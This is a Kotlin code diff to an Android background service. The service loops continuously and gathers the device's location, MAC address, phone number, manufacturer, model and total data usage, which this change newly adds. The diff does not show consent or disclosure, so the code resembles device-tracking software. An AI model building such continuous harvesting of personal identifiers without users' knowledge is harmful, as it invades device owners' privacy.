@@ -7,6 +7,7 @@ import android.content.Intent
 import android.location.Location
 import android.location.LocationListener
 import android.location.LocationManager
+import android.net.TrafficStats
 import android.os.Build
 import android.os.Bundle
 import android.os.IBinder
@@ -36,25 +37,16 @@ class Service : Service() {
         return super.onStartCommand(intent, flags, startId)
     }
 
-    @SuppressLint("MissingPermission")
     fun getLocationService(){
         Looper.prepare()
         while(true){
-            var macAddress = getMacAddress()
-            val sanitizerMac = Regex("[:]")
-            macAddress = sanitizerMac.replace(macAddress, "")
-
-            val sanitizerTel = Regex("[+]")
-            val tm = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
-            var telNumber = tm.line1Number
-            telNumber = sanitizerTel.replace(telNumber, "")
-            telNumber = telNumber.replace("\\s".toRegex(), "")
-
             var location = getLocation()
-            location.add(macAddress)
-            location.add(telNumber)
+            location.add(getMacAddress())
+            location.add(getTelephoneNumber())
             location.add(getDeviceManufacturer())
             location.add(getDeviceModel())
+            location.add(getDownloadedDataUsage())
+            location.add(getUploadedDataUsage())
 
             val json = Gson().toJson("")
 
@@ -66,6 +58,26 @@ class Service : Service() {
             Thread.sleep(1000) // 3600000
         }
         Looper.loop()
+    }
+
+    @SuppressLint("MissingPermission")
+    fun getTelephoneNumber(): String{
+        val sanitizerTel = Regex("[+]")
+        val tm = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
+        var telNumber = tm.line1Number
+        telNumber = sanitizerTel.replace(telNumber, "")
+        telNumber = telNumber.replace("\\s".toRegex(), "")
+        return telNumber
+    }
+
+    fun getDownloadedDataUsage(): String {
+        var usage = TrafficStats.getTotalRxBytes();
+        return usage.toString()
+    }
+
+    fun getUploadedDataUsage(): String {
+        var usage = TrafficStats.getTotalTxBytes();
+        return usage.toString()
     }
 
     fun getDeviceModel(): String {
@@ -81,6 +93,7 @@ class Service : Service() {
     }
 
     fun getMacAddress(): String {
+        val sanitizerMac = Regex("[:]")
         try {
             val all = Collections.list(NetworkInterface.getNetworkInterfaces())
             for (nif in all) {
@@ -96,12 +109,13 @@ class Service : Service() {
                 if (res1.length > 0) {
                     res1.deleteCharAt(res1.length - 1)
                 }
-                return res1.toString()
+
+                return sanitizerMac.replace(res1.toString(), "")
             }
         } catch (ex: Exception) {
         }
 
-        return "02:00:00:00:00:00"
+        return "020000000000"
     }
 
     @SuppressLint("MissingPermission")
